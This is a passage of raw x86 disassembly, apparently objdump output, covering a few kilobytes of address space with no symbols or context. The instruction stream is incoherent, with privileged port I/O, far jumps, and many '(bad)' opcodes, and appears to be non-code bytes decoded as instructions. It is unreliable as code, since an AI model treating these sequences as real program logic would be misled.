  40782f:	add    cl,BYTE PTR [ebp-0x2e]
  407832:	aas    
  407833:	pop    edi
  407834:	cli    
  407835:	mov    eax,0xa4253eca
  40783a:	fucomi st,st(7)
  40783c:	enter  0xa0fd,0xc0
  407840:	jg     0x40782e
  407842:	inc    ebp
  407843:	xor    eax,0xfa4db547
  407848:	xor    al,0x8b
  40784a:	mov    ?,ecx
  40784c:	and    BYTE PTR [ecx],0xb5
  40784f:	and    dl,bl
  407851:	rcr    BYTE PTR [eax-0x2d],cl
  407854:	cdq    
  407855:	ds mov dl,0x33
  407858:	retf   0xff06
  40785b:	ss cmp al,dl
  40785e:	leave  
  40785f:	jbe    0x407824
  407861:	in     al,0x1f
  407863:	jmp    0x26ad:0x1e569b8a
  40786a:	jb     0x4078be
  40786c:	hlt    
  40786d:	add    edx,DWORD PTR [esi+0x6072096b]
  407873:	push   0x3ed99db6
  407878:	icebp  
  407879:	push   ss
  40787a:	pusha  
  40787b:	pop    edi
  40787c:	mov    al,ds:0x8788d45a
  407881:	dec    edx
  407882:	inc    edx
  407883:	pop    esp
  407884:	out    0xd,al
  407886:	in     al,dx
  407887:	stos   DWORD PTR es:[edi],eax
  407888:	push   ebx
  407889:	sahf   
  40788a:	sub    ecx,DWORD PTR [edx+ebx*2-0x7a]
  40788e:	mov    ds:0x8c26f46f,al
  407893:	fs mov esi,0xc2a7ad74
  407899:	div    DWORD PTR [eax-0x174f7c73]
  40789f:	pop    ds
  4078a0:	imul   ecx,edx,0xc09f6da7
  4078a6:	iret   
  4078a7:	out    dx,al
  4078a8:	ja     0x4078e4
  4078aa:	fsub   st,st(3)
  4078ac:	in     eax,dx
  4078ad:	outs   dx,BYTE PTR ds:[esi]
  4078ae:	push   0xc3eaba6b
  4078b3:	jge    0x40789a
  4078b5:	push   0x53e77a72
  4078ba:	pop    es
  4078bb:	jne    0x407929
  4078bd:	loopne 0x40792f
  4078bf:	inc    ebx
  4078c0:	jge    0x4078c9
  4078c2:	push   ds
  4078c3:	mov    edx,0x4b8e2224
  4078c8:	xchg   ebp,eax
  4078c9:	xlat   BYTE PTR ds:[ebx]
  4078cb:	shr    BYTE PTR [ebx],1
  4078cd:	imul   edi,DWORD PTR [edx+ebx*2-0x7a],0x15
  4078d2:	outs   dx,DWORD PTR ds:[esi]
  4078d3:	push   edi
  4078d4:	mov    edx,0x430f4eb3
  4078d9:	out    dx,eax
  4078da:	pop    esp
  4078db:	xor    ebx,ecx
  4078dd:	popf   
  4078de:	out    0xe8,al
  4078e0:	(bad)  
  4078e1:	fst    QWORD PTR [edx+0x3bea626e]
  4078e7:	in     al,dx
  4078e8:	xchg   dl,dl
  4078ea:	loopne 0x4078c1
  4078ec:	mov    ah,0xba
  4078ee:	push   edx
  4078ef:	test   BYTE PTR [ebx],cl
  4078f1:	add    al,0x51
  4078f3:	cli    
  4078f4:	mov    edi,0xa202872d
  4078f9:	call   0x7b6d1140
  4078fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078ff:	cmp    eax,0xa91bccbc
  407904:	std    
  407905:	imul   ebx,DWORD PTR [edx-0x62fccdae],0xffffffe4
  40790c:	sbb    eax,0x7d70c8a7
  407911:	push   0xffffffa0
  407913:	xor    DWORD PTR [ecx],esp
  407915:	mov    cl,0x25
  407917:	fsubrp st(2),st
  407919:	pop    esp
  40791a:	leave  
  40791b:	gs mov esp,eax
  40791e:	jae    0x407940
  407920:	cwde   
  407921:	cdq    
  407922:	sbb    BYTE PTR [esi+0x69],ch
  407925:	js     0x4078d7
  407927:	std    
  407928:	cli    
  407929:	mov    esi,0xd5d07cd9
  40792e:	stos   DWORD PTR es:[edi],eax
  40792f:	pusha  
  407930:	pop    esp
  407931:	cmp    ebx,esi
  407933:	add    eax,0x146c2cf8
  407938:	div    DWORD PTR [ecx+edi*1+0x3b280085]
  40793f:	mov    ebp,0xdf5ef52c
  407944:	xor    eax,0x6243201e
  407949:	jno    0x4078dc
  40794b:	lahf   
  40794c:	or     eax,0x2a4aabe6
  407951:	mov    esp,0x1a9c78b0
  407956:	pushf  
  407957:	push   ss
  407958:	cdq    
  407959:	push   ss
  40795a:	xchg   ebx,eax
  40795b:	(bad)  
  40795c:	cmp    DWORD PTR [edi-0x519a1a99],edx
  407962:	pop    ebx
  407963:	sbb    ecx,DWORD PTR [ebx+0x24]
  407966:	adc    esp,DWORD PTR [ecx]
  407968:	popf   
  407969:	sbb    al,0x1c
  40796b:	dec    edi
  40796c:	mov    edi,0xeca58468
  407971:	or     eax,0x9c3c19ac
  407976:	or     BYTE PTR ds:0x734632bc,al
  40797c:	mov    WORD PTR [esi-0x43],fs
  40797f:	jmp    0xa74e:0x373afe71
  407986:	cmp    al,0xe0
  407988:	jo     0x4079b3
  40798a:	(bad)  
  40798b:	mov    bh,0xfb
  40798d:	stc    
  40798e:	sub    al,BYTE PTR [edi]
  407990:	pop    ss
  407991:	xor    bl,al
  407993:	or     esp,DWORD PTR [eax+edi*1+0x1a]
  407997:	out    0xc6,al
  407999:	cmp    al,0x5c
  40799b:	inc    ebp
  40799c:	pop    edx
  40799d:	mov    esi,DWORD PTR [edi+0x4a]
  4079a0:	lock xchg ebx,eax
  4079a2:	xchg   ecx,eax
  4079a3:	(bad)  
  4079a4:	out    0x50,eax
  4079a6:	jno    0x407a23
  4079a8:	jle    0x4079d8
  4079aa:	dec    ebx
  4079ab:	inc    esp
  4079ac:	sbb    DWORD PTR [esi-0x78],esp
  4079af:	outs   dx,DWORD PTR ds:[esi]
  4079b0:	repnz push esp
  4079b2:	or     dl,BYTE PTR [ebx]
  4079b4:	shr    DWORD PTR [edi],0xf1
  4079b7:	retf   
  4079b8:	stos   DWORD PTR es:[edi],eax
  4079b9:	inc    ebx
  4079ba:	(bad)  
  4079bb:	popf   
  4079bc:	or     BYTE PTR [ebx-0x79],cl
  4079bf:	in     al,dx
  4079c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079c1:	add    eax,0xea0ab31a
  4079c6:	jle    0x407967
  4079c8:	retf   
  4079c9:	cli    
  4079ca:	sub    BYTE PTR [edx],dl
  4079cc:	xor    al,0x4a
  4079ce:	adc    bh,BYTE PTR [edi+0x42e10824]
  4079d4:	mov    ds:0xd85a8216,eax
  4079d9:	sahf   
  4079da:	xchg   esp,eax
  4079db:	mov    DWORD PTR [esi],edx
  4079dd:	loope  0x4079ec
  4079df:	jns    0x407a58
  4079e1:	arpl   WORD PTR [esi+0x5e],sp
  4079e4:	sbb    edi,esp
  4079e6:	sub    BYTE PTR [ecx+0x494228a2],al
  4079ec:	inc    ebx
  4079ed:	rcl    ebx,cl
  4079ef:	dec    ebp
  4079f0:	or     eax,0x434fc9e3
  4079f5:	cdq    
  4079f6:	add    esi,DWORD PTR [ebp-0x79dc82c3]
  4079fc:	push   ds
  4079fd:	popa   
  4079fe:	mov    ch,0x6a
  407a00:	mov    eax,ds:0xd94a97aa
  407a05:	mov    ch,0x75
  407a07:	inc    edx
  407a08:	aaa    
  407a09:	cmp    esi,esp
  407a0b:	pop    es
  407a0c:	jge    0x4079e1
  407a0e:	rol    BYTE PTR [eax],cl
  407a10:	jo     0x4079e1
  407a12:	xchg   ebp,eax
  407a13:	repnz lea ebx,fs:[esi+ebx*4-0x70]
  407a19:	and    eax,0xc9369f27
  407a1e:	enter  0x45c7,0x13
  407a22:	mov    ebp,0xa17a7b87
  407a27:	ja     0x407a1e
  407a29:	inc    ebp
  407a2a:	pop    esp
  407a2b:	dec    ebx
  407a2c:	xor    esi,DWORD PTR [eax-0x4c]
  407a2f:	cmp    al,0x4a
  407a31:	add    eax,0x86f5f01b
  407a36:	cmp    DWORD PTR [edi+ebp*4+0x72],ebx
  407a3a:	dec    edi
  407a3b:	repnz das 
  407a3d:	shr    BYTE PTR [edi+0x43999eb],cl
  407a43:	fsubr  QWORD PTR [edi-0x6]
  407a46:	sub    BYTE PTR [edi-0x64],bh
  407a49:	xor    DWORD PTR [eax-0x5d20a9d2],ebx
  407a4f:	setnp  BYTE PTR ds:0x2f5aa884
  407a56:	mov    ds:0x57f78767,eax
  407a5b:	mov    eax,ds:0xe4293089
  407a60:	cwde   
  407a61:	dec    DWORD PTR [esi]
  407a63:	mov    al,0x2d
  407a65:	xor    al,BYTE PTR [edx+edx*2-0x64]
  407a69:	mov    dl,0x70
  407a6b:	and    eax,0xabc9ae60
  407a70:	inc    esi
  407a71:	push   es
  407a72:	inc    esp
  407a73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a75:	mov    edi,0x624a35c9
  407a7a:	push   ds
  407a7b:	neg    DWORD PTR ds:0x9772ddd2
  407a81:	(bad)
  407a84:	addr16 push cs
  407a86:	lods   al,BYTE PTR ds:[esi]
  407a87:	mov    cl,0x31
  407a89:	adc    ebx,0x8e196ad7
  407a8f:	cmp    DWORD PTR [edx],esp
  407a91:	icebp  
  407a92:	xchg   edx,eax
  407a93:	adc    ah,BYTE PTR [esi+eiz*1]
  407a96:	shl    ah,1
  407a98:	jecxz  0x407ab7
  407a9a:	call   DWORD PTR [eax+0x1a232314]
  407aa0:	xor    bl,BYTE PTR [eax+0x3a]
  407aa3:	cmp    eax,DWORD PTR [ecx+0xe]
  407aa6:	imul   esp,DWORD PTR [edi],0xf13f58f0
  407aac:	add    ebp,DWORD PTR [eax+0x4e]
  407aaf:	mov    al,ds:0xa009e3a4
  407ab4:	fucom  st(5)
  407ab6:	jle    0x407a5e
  407ab8:	daa    
  407ab9:	imul   ecx,DWORD PTR [eax],0xffffffbb
  407abc:	sub    dh,ah
  407abe:	inc    ebp
  407abf:	cmc    
  407ac0:	sub    bh,dl
  407ac2:	mov    esi,?
  407ac4:	dec    esp
  407ac5:	mov    esp,DWORD PTR [ebx+0x6ec528e]
  407acb:	rcr    BYTE PTR [eax],cl
  407acd:	or     bh,BYTE PTR [ecx+ebp*1-0x3cf74a50]
  407ad4:	sub    bl,BYTE PTR [ecx+eax*4]
  407ad7:	fwait
  407ad8:	or     DWORD PTR [edi+0x73],esi
  407adb:	inc    edi
  407adc:	sbb    al,0xae
  407ade:	adc    BYTE PTR [esi+0x220e8964],al
  407ae4:	add    ch,BYTE PTR ds:0x1fc7f6ea
  407aea:	scas   eax,DWORD PTR es:[edi]
  407aeb:	ret    0x6224
  407aee:	dec    ebp
  407af0:	push   eax
  407af1:	xlat   BYTE PTR ds:[ebx]
  407af2:	add    eax,0xce8b522d
  407af7:	pop    edi
  407af8:	retf   0x5f74
  407afb:	or     eax,0x6ccffc02
  407b00:	cs mov ch,0x8a
  407b03:	rcr    DWORD PTR [edx],1
  407b05:	mov    ds:0x92bea200,al
  407b0a:	mov    bh,cl
  407b0c:	or     al,0xc6
  407b0e:	xchg   edx,eax
  407b0f:	aam    0x14
  407b11:	and    edx,edx
  407b13:	mov    edi,0x7ea4f8cd
  407b18:	sub    al,0x10
  407b1a:	inc    esi
  407b1b:	inc    ecx
  407b1c:	adc    DWORD PTR [edx-0x12c7d19c],ebp
  407b22:	fdiv   st(1),st
  407b24:	out    0x30,eax
  407b26:	jbe    0x407b44
  407b28:	ins    DWORD PTR es:[edi],dx
  407b29:	lds    ecx,FWORD PTR [ebx]
  407b2b:	adc    BYTE PTR [ebx+0x7e],dh
  407b2e:	imul   ebp,DWORD PTR [edx+0x20974488],0x27c4fe4d
  407b38:	adc    eax,0xfae4f274
  407b3d:	shl    DWORD PTR [ebx],cl
  407b3f:	sbb    dl,0x18
  407b42:	xchg   esi,eax
  407b43:	mov    DWORD PTR [ebx+ebp*1],ecx
  407b46:	and    dl,BYTE PTR [esp+ebp*4-0x23]
  407b4a:	je     0x407b4a
  407b4c:	int    0x35
  407b4e:	dec    esi
  407b4f:	mov    eax,0xbff434b9
  407b54:	aam    0x4b
  407b56:	sub    al,0x65
  407b58:	mov    ecx,0xa76b9989
  407b5d:	fisub  DWORD PTR [ebx+0x6b02ea2b]
  407b63:	jle    0x407b64
  407b65:	in     eax,0xd9
  407b67:	cmp    BYTE PTR [edx-0x36],bl
  407b6a:	mov    edi,0x9643d8aa
  407b6f:	stos   BYTE PTR es:[edi],al
  407b70:	pop    ds
  407b71:	icebp  
  407b72:	xchg   esp,ebx
  407b74:	xor    al,bh
  407b76:	stc    
  407b77:	xchg   BYTE PTR [edi],ah
  407b79:	sti    
  407b7a:	ds and eax,0x5aeade19
  407b80:	ret    0xaa2
  407b83:	ins    BYTE PTR es:[edi],dx
  407b84:	nop
  407b85:	xor    ebp,ebp
  407b87:	cmp    dl,BYTE PTR [edx]
  407b89:	out    0xb4,al
  407b8b:	bound  esi,QWORD PTR [ecx]
  407b8d:	je     0x407b87
  407b8f:	dec    ecx
  407b90:	aaa    
  407b91:	sbb    dh,BYTE PTR [ebp+0x4d]
  407b94:	and    eax,0x4f2bdf18
  407b99:	ss cdq 
  407b9b:	scas   al,BYTE PTR es:[edi]
  407b9c:	dec    ebx
  407b9d:	data16 mov ch,0x56
  407ba0:	clc    
  407ba1:	cmp    dl,al
  407ba3:	cmp    eax,ecx
  407ba5:	inc    ebx
  407ba6:	inc    ecx
  407ba7:	mov    ds:0xd36b3b83,al
  407bac:	push   esp
  407bad:	xchg   BYTE PTR [ebp-0x13],bh
  407bb0:	js     0x407baa
  407bb2:	mov    al,ds:0xc9fbbfdb
  407bb7:	push   ss
  407bb8:	mov    al,0xf9
  407bba:	enter  0xd046,0xe0
  407bbe:	test   bl,bl
  407bc0:	adc    edx,esp
  407bc2:	push   esp
  407bc3:	ret    
  407bc4:	and    al,BYTE PTR [edx]
  407bc6:	shr    ebp,1
  407bc8:	das    
  407bc9:	dec    esi
  407bca:	lods   al,BYTE PTR ds:[esi]
  407bcb:	(bad)
  407bce:	adc    eax,0xfc028d90
  407bd3:	dec    edx
  407bd4:	repnz push ebp
  407bd6:	out    0xd2,eax
  407bd8:	data16 (bad) 
  407bda:	scas   eax,DWORD PTR es:[edi]
  407bdb:	jmp    0x4ff440ad
  407be0:	mov    DWORD PTR [eax-0x56],ecx
  407be3:	(bad)  
  407be4:	fadd   QWORD PTR [edi+ebx*4-0x6e]
  407be8:	inc    edx
  407be9:	push   es
  407bea:	jo     0x407baa
  407bec:	add    eax,ebx
  407bee:	mov    WORD PTR fs:[eax],ds
  407bf1:	loop   0x407bb2
  407bf3:	dec    ebx
  407bf4:	fsubrp st(1),st
  407bf6:	repz dec ebp
  407bf8:	out    dx,al
  407bf9:	mov    bl,BYTE PTR [eax-0x2b]
  407bfc:	scas   eax,DWORD PTR es:[edi]
  407bfd:	add    DWORD PTR [edi-0x42],0x24acd92d
  407c04:	ins    DWORD PTR es:[edi],dx
  407c05:	ins    BYTE PTR es:[edi],dx
  407c06:	cmp    eax,0x462a03e3
  407c0b:	xchg   ebp,eax
  407c0c:	out    0x42,eax
  407c0e:	fist   WORD PTR [ebx]
  407c10:	or     al,0xad
  407c12:	inc    esi
  407c13:	sub    eax,esp
  407c15:	jne    0x407c51
  407c17:	loopne 0x407bbd
  407c19:	int    0x7f
  407c1b:	push   ss
  407c1c:	sbb    DWORD PTR [edx],eax
  407c1e:	or     BYTE PTR [ebp+0x51],ch
  407c21:	test   BYTE PTR [ecx+0x79906fae],0x33
  407c28:	xchg   BYTE PTR [ebp-0x16],al
  407c2b:	fcomp  DWORD PTR [ecx+0x565fe47]
  407c31:	test   BYTE PTR [esi],al
  407c33:	xor    BYTE PTR [edx],cl
  407c35:	xchg   esi,edi
  407c37:	sbb    edx,DWORD PTR [edx+0x65]
  407c3a:	aad    0xe7
  407c3c:	lds    eax,FWORD PTR [eax+esi*8-0x1e]
  407c40:	enter  0x39cd,0xbc
  407c44:	out    0x4f,eax
  407c46:	popa   
  407c47:	fld    QWORD PTR [eax-0x34]
  407c4a:	jne    0x407cb0
  407c4c:	jae    0x407c89
  407c4e:	cdq    
  407c4f:	dec    esp
  407c50:	inc    esp
  407c51:	ficom  DWORD PTR [eax+0x68]
  407c54:	(bad)  
  407c55:	je     0x407cac
  407c57:	xor    BYTE PTR [edx],cl
  407c59:	xchg   ebx,eax
  407c5a:	pop    esi
  407c5b:	or     al,0xd9
  407c5d:	adc    al,0x9f
  407c5f:	call   0x2748:0xf8b0cb1b
  407c66:	sar    DWORD PTR [edx],0x28
  407c69:	xor    DWORD PTR [esi-0x45],edi
  407c6c:	cmp    al,0x7
  407c6e:	xchg   edi,eax
  407c6f:	mov    ebx,0x33a8bcc
  407c74:	repnz mov ecx,0xc0fe96d6
  407c7a:	pop    esi
  407c7b:	scas   al,BYTE PTR es:[edi]
  407c7c:	xor    edx,ebp
  407c7e:	jae    0x407c61
  407c80:	test   DWORD PTR ds:0xe4909432,edi
  407c86:	pop    eax
  407c87:	xchg   ebx,eax
  407c88:	or     al,0x81
  407c8a:	mov    ds:0x70be008f,al
  407c8f:	and    bl,cl
  407c91:	lods   al,BYTE PTR ds:[esi]
  407c92:	xchg   edi,eax
  407c93:	or     BYTE PTR [esp+edx*8+0x5],0x77
  407c98:	inc    BYTE PTR [esp+eax*8]
  407c9b:	pop    esp
  407c9c:	into   
  407c9d:	arpl   WORD PTR [edx-0x43],sp
  407ca0:	adc    al,BYTE PTR [edx+0x6a338643]
  407ca6:	add    DWORD PTR [ecx-0x2f],eax
  407ca9:	sub    DWORD PTR [esp+ebp*2],ebx
  407cac:	mov    bh,0x5d
  407cae:	rcl    dl,0x61
  407cb1:	and    eax,0x4f262a1b
  407cb6:	inc    esi
  407cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cb8:	pop    esi
  407cb9:	stc    
  407cba:	mov    al,0x7b
  407cbc:	pop    eax
  407cbe:	cld    
  407cbf:	add    bl,BYTE PTR [ebx]
  407cc1:	xchg   edi,eax
  407cc2:	mov    ah,0xda
  407cc4:	mov    al,ds:0x6488a042
  407cc9:	dec    esp
  407cca:	scas   eax,DWORD PTR es:[edi]
  407ccb:	xchg   ebx,eax
  407ccc:	cld    
  407ccd:	inc    esi
  407cce:	loopne 0x407cba
  407cd0:	daa    
  407cd1:	sub    al,0xf8
  407cd3:	or     DWORD PTR [ebp-0x4d47ee33],edi
  407cd9:	add    edx,DWORD PTR [eax+0x6f]
  407cdc:	and    DWORD PTR [edx-0xca9f020],0xffffff82
  407ce3:	jg     0x407d51
  407ce5:	shl    BYTE PTR [esi],cl
  407ce7:	pushf  
  407ce8:	inc    ebx
  407ce9:	xchg   esi,eax
  407cea:	(bad)  
  407ceb:	jp     0x407d12
  407ced:	out    0xf4,al
  407cef:	call   0xf0c4:0xfe2afe74
  407cf6:	cmp    dh,BYTE PTR [ebx-0x3]
  407cf9:	mov    WORD PTR [eax-0x63],cs
  407cfc:	push   ss
  407cfd:	sahf   
  407cfe:	lods   eax,DWORD PTR ds:[esi]
  407cff:	stc    
  407d00:	inc    esp
  407d01:	retf   
  407d02:	xor    eax,0xf802338e
  407d07:	adc    BYTE PTR [edx],ch
  407d09:	push   esp
  407d0a:	std    
  407d0b:	jbe    0x407d14
  407d0d:	daa    
  407d0e:	mov    eax,0x9046d289
  407d13:	inc    esi
  407d14:	sbb    eax,0x510f8a0a
  407d19:	repz ror BYTE PTR [edi+0x55],1
  407d1d:	pusha  
  407d1e:	jno    0x407d02
  407d20:	(bad)  
  407d21:	push   es
  407d22:	jmp    0x2eefdfa4
  407d27:	in     al,dx
  407d28:	sti    
  407d29:	cmp    eax,0xcd0baf41
  407d2e:	mov    ebp,0x3aa344f6
  407d33:	sub    eax,0x91ffa1b7
  407d38:	jae    0x407d9c
  407d3a:	rol    edi,1
  407d3c:	xor    dh,BYTE PTR [edi-0x38]
  407d3f:	rcr    DWORD PTR [esi],1
  407d41:	and    eax,DWORD PTR [eax-0x4853c1a3]
  407d47:	jl     0x407d0b
  407d49:	or     BYTE PTR [edx-0x1d],bl
  407d4c:	push   ebx
  407d4d:	in     al,dx
  407d4e:	xor    al,0xe3
  407d50:	test   bl,ah
  407d52:	ins    DWORD PTR es:[edi],dx
  407d53:	pop    edx
  407d54:	sbb    DWORD PTR [ebx+esi*4+0x35],eax
  407d58:	loope  0x407db7
  407d5a:	mov    gs,WORD PTR [edi]
  407d5c:	(bad)  
  407d5d:	idiv   BYTE PTR [ecx+0x13]
  407d60:	setle  BYTE PTR [esi+0x3a97fc2c]
  407d67:	lahf   
  407d68:	retf   
  407d69:	dec    ecx
  407d6a:	imul   BYTE PTR [ebp+eax*2-0x62f2e2e0]
  407d71:	push   0x9428c81d
  407d76:	repz clc 
  407d78:	lahf   
  407d79:	scas   al,BYTE PTR es:[edi]
  407d7a:	out    dx,al
  407d7b:	jb     0x407d01
  407d7d:	mov    esi,0x67dbf561
  407d82:	dec    edi
  407d83:	mov    ah,0x24
  407d85:	xlat   BYTE PTR ds:[ebx]
  407d86:	dec    ebx
  407d87:	mov    ebx,eax
  407d89:	(bad)  
  407d8a:	pusha  
  407d8b:	mov    esp,0x942bce24
  407d90:	mov    ah,0xc8
  407d92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d93:	fwait
  407d94:	and    bl,BYTE PTR [ecx-0x1b7e9018]
  407d9a:	push   ds
  407d9b:	cmp    BYTE PTR [ebp+0x52e6f939],cl
  407da1:	jl     0x407dbe
  407da3:	fcom   DWORD PTR [ebx+eax*8]
  407da6:	loop   0x407da9
  407da8:	(bad)  
  407da9:	add    al,0xfe
  407dab:	(bad)  
  407dac:	call   0xa0ed7fed
  407db1:	daa    
  407db2:	ret    
  407db3:	dec    eax
  407db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407db5:	sti    
  407db6:	mov    dl,0x6e
  407db8:	xchg   esi,esp
  407dba:	jmp    0x407d58
  407dbc:	ins    DWORD PTR es:[edi],dx
  407dbd:	mov    al,0xa8
  407dbf:	pop    edi
  407dc0:	stos   BYTE PTR es:[edi],al
  407dc1:	mov    DWORD PTR [edx+0x2c],edi
  407dc4:	outs   dx,BYTE PTR ds:[esi]
  407dc5:	ret    
  407dc6:	mov    ch,0xa2
  407dc8:	scas   eax,DWORD PTR es:[edi]
  407dc9:	fcomp  QWORD PTR [edi+0x56]
  407dcc:	ficom  DWORD PTR [ebx-0xa86f791]
  407dd2:	adc    ecx,DWORD PTR ds:0x9b994123
  407dd8:	xchg   ebx,eax
  407dd9:	push   esp
  407dda:	shl    BYTE PTR [edx-0x26],cl
  407ddd:	push   ss
  407dde:	pop    ecx
  407ddf:	jbe    0x407dad
  407de1:	jmp    0x407de3
  407de3:	and    al,0xd0
  407de5:	mov    ebp,0xafa5fe13
  407dea:	jb     0x407d8e
  407dec:	dec    ecx
  407ded:	jnp    0x407de4
  407def:	sar    BYTE PTR [eax],cl
  407df1:	into   
  407df2:	fild   WORD PTR [esi+0x36d04312]
  407df8:	pop    ebp
  407df9:	cmp    ecx,DWORD PTR [eax-0x6705ff79]
  407dff:	inc    esi
  407e00:	rol    DWORD PTR [ecx+0x6a],cl
  407e03:	cwde   
  407e04:	retf   
  407e05:	cmp    al,0xe5
  407e07:	inc    ebp
  407e08:	(bad)  
  407e09:	sub    DWORD PTR [ecx-0x5f83490f],ebx
  407e0f:	dec    edi
  407e10:	xor    dh,dh
  407e12:	stos   BYTE PTR es:[edi],al
  407e13:	jae    0x407e46
  407e15:	add    bl,bh
  407e17:	or     bh,bh
  407e19:	imul   edi,ebp,0xffffff82
  407e1c:	pop    ds
  407e1d:	leave  
  407e1e:	cld    
  407e1f:	enter  0xee95,0xe3
  407e23:	cmp    al,0xdd
  407e25:	ret    
  407e26:	(bad)  
  407e27:	cmp    al,0xc
  407e29:	jnp    0x407e0d
  407e2b:	rcr    BYTE PTR fs:[edi],cl
  407e2e:	fs iret 
  407e30:	and    BYTE PTR [eax],0x16
  407e33:	jl     0x407e9d
  407e35:	imul   eax,ecx,0xaed09c50
  407e3b:	sbb    edx,DWORD PTR [ebx-0x3a]
  407e3e:	cdq    
  407e3f:	sbb    BYTE PTR [eax+0x4182450d],al
  407e45:	(bad)  
  407e46:	xlat   BYTE PTR ds:[ebx]
  407e47:	xchg   ebx,eax
  407e48:	inc    ebx
  407e49:	jmp    0x299644ab
  407e4e:	adc    edi,DWORD PTR [ecx+edi*8-0x5f]
  407e52:	pop    eax
  407e53:	repz jmp 0x407e0d
  407e56:	xor    eax,0xf0851c9f
  407e5b:	mov    ds:0xb43e1a33,al
  407e60:	dec    ecx
  407e61:	xor    eax,0xbdd40003
  407e66:	jns    0x407e87
  407e68:	je     0x407e4a
  407e6a:	hlt    
  407e6b:	push   ds
  407e6c:	lods   eax,DWORD PTR ds:[esi]
  407e6d:	test   edi,ebx
  407e6f:	mov    ds:0x9ff10a62,al
  407e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e75:	loope  0x407ede
  407e77:	jmp    0x407ee7
  407e79:	popf   
  407e7a:	je     0x407ee8
  407e7c:	fsub   QWORD PTR [esi-0x44]
  407e7f:	or     dl,BYTE PTR gs:[esi]
  407e82:	retf   
  407e83:	xchg   esi,eax
  407e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e85:	je     0x407f05
  407e87:	push   esp
  407e88:	xchg   bl,dl
  407e8a:	cmp    al,BYTE PTR [ebx]
  407e8c:	retf   
  407e8d:	pop    edx
  407e8e:	shr    BYTE PTR [ecx-0x70],0xac
  407e92:	out    dx,eax
  407e93:	sbb    DWORD PTR [esi-0x68],edi
  407e96:	adc    eax,0x6edea365
  407e9b:	imul   ecx,edi,0x5826163b
  407ea1:	mov    dl,0x94
  407ea3:	pop    edx
  407ea4:	aam    0xdf
  407ea6:	pushf  
  407ea7:	dec    esi
  407ea8:	adc    BYTE PTR [edx+0x4],ah
  407eab:	(bad)  
  407eac:	cli    
  407ead:	mov    DWORD PTR [esi+0x3d],esi
  407eb0:	(bad)  
  407eb1:	mov    edx,0x904c60f7
  407eb6:	les    edx,FWORD PTR [eax]
  407eb8:	cdq    
  407eb9:	cmc    
  407eba:	call   0x37bc:0xde181195
  407ec1:	xor    ecx,DWORD PTR [esi+0x594eb5b7]
  407ec7:	mov    ds:0xcaf78ad9,al
  407ecc:	jmp    0xbd47479e
  407ed1:	call   0x54c7:0x455288fd
  407ed8:	xchg   ecx,eax
  407ed9:	out    dx,eax
  407eda:	and    eax,0x66b75ec5
  407edf:	lods   eax,DWORD PTR ds:[si]
  407ee1:	jno    0x407e95
  407ee3:	xlat   BYTE PTR ds:[ebx]
  407ee4:	jnp    0x407ec0
  407ee6:	pop    esp
  407ee7:	and    ebp,DWORD PTR [ebp-0x202ed902]
  407eed:	dec    DWORD PTR [edx+ecx*2+0x1b]
  407ef1:	xchg   edi,eax
  407ef2:	xchg   dl,ch
  407ef4:	retf   
  407ef5:	adc    DWORD PTR [ebp+0x66],edi
  407ef8:	ret    0x1e65
  407efb:	gs push 0xffffffd6
  407efe:	add    BYTE PTR [esi+0x75],dl
  407f01:	neg    BYTE PTR [ebx]
  407f03:	(bad)  
  407f04:	lock sub BYTE PTR [edx],0x85
  407f08:	xchg   edx,eax
  407f09:	aam    0x20
  407f0b:	dec    eax
  407f0c:	pusha  
  407f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f0e:	xchg   dl,dh
  407f10:	xchg   edx,ecx
  407f12:	js     0x407ec8
  407f14:	vmread DWORD PTR [ecx+0x5a],edi
  407f18:	push   cs
  407f19:	in     eax,0xf0
  407f1b:	mov    ds:0xbef34d05,al
  407f20:	push   edi
  407f21:	not    DWORD PTR [esi]
  407f23:	shr    bh,0x44
  407f26:	inc    ebx
  407f27:	jae    0x407f74
  407f29:	push   ebp
  407f2a:	ins    BYTE PTR es:[edi],dx
  407f2b:	mov    bh,0x2
  407f2d:	(bad)  
  407f2e:	daa    
  407f2f:	adc    dl,BYTE PTR [edx]
  407f31:	xchg   edx,eax
  407f32:	inc    eax
  407f33:	pop    esp
  407f34:	xchg   ebp,eax
  407f35:	xchg   ebx,esp
  407f37:	cmp    dl,BYTE PTR [edi+0x229a92a5]
  407f3d:	jno    0x407f11
  407f3f:	addr16 ja 0x407f92
  407f42:	bound  edx,QWORD PTR [eax-0x1192d309]
  407f48:	addr16 loop 0x407f45
  407f4b:	or     al,0x61
  407f4d:	jle    0x407fb1
  407f4f:	stc    
  407f50:	sub    BYTE PTR [edi+0x3818a0f8],al
  407f56:	sti    
  407f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f58:	cdq    
  407f59:	data16 mov ?,WORD PTR [eax-0x53]
  407f5d:	cmp    eax,0xbde9625a
  407f62:	repz ret 
  407f64:	push   esp
  407f65:	or     esp,DWORD PTR [ecx-0x3c]
  407f68:	jmp    0xb586b6a7
  407f6d:	cld    
  407f6e:	cdq    
  407f6f:	xor    eax,0x4e5d2474
  407f74:	dec    esi
  407f75:	dec    ebx
  407f76:	pusha  
  407f77:	mov    edi,0x71b68362
  407f7c:	test   DWORD PTR ds:[esi+0x23d5e71b],edx
  407f83:	inc    ebp
  407f84:	das    
  407f85:	jns    0x407fcf
  407f87:	aas    
  407f88:	sub    al,0xb2
  407f8a:	not    al
  407f8c:	and    BYTE PTR [ecx-0x39],cl
  407f8f:	neg    esp
  407f91:	cli    
  407f92:	xor    eax,0x6002c41b
  407f97:	popf   
  407f98:	cli    
  407f99:	push   eax
  407f9a:	sbb    DWORD PTR [ecx],ebx
  407f9c:	ror    BYTE PTR [ebx+0x6f],1
  407f9f:	cwde   
  407fa0:	push   ebp
  407fa1:	loop   0x407f83
  407fa3:	scas   eax,DWORD PTR es:[edi]
  407fa4:	test   BYTE PTR cs:[eax+0x1],ch
  407fa8:	push   0xe1e9aee0
